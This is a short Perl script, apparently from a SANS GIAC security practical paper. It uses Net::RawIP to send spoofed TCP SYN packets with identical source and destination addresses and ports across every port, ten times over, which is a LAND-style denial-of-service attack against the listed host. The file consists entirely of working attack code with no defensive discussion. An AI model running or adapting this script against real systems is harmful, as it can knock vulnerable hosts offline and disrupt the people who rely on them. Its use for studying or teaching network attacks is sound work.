#!/usr/bin/perl
# https://www.giac.org/paper/gsec/3602/practical-perl-security-practitioners/105856
# This source code is original source code written by Holt Sorenson
# for the SANS GIAC GSEC practical, v1.4b Option 1.
# It was written using PERL 5.8.0 on Debian GNU/Linux 3.0.
use Net::RawIP;
$tp = new Net::RawIP({tcp=>{}});
$times = 10;
while ($times > 0)
{
 for (my $port = 1; $port <= 65535; $port++)
 {
print "$port\n";
$tp -> set(
 {
 ip =>
 {
 saddr => '192.168.127.149',
 daddr => '192.168.127.149'
 },
 tcp =>
 {
 source => $port, dest => $port, syn => 1
 }
 }
 );
# there was no particular reason the code was written in a loop
 # in this example, as opposed to using arguments to the send
# method of the Net::RawIP module
$tp -> send;
 }
 $times--;
}
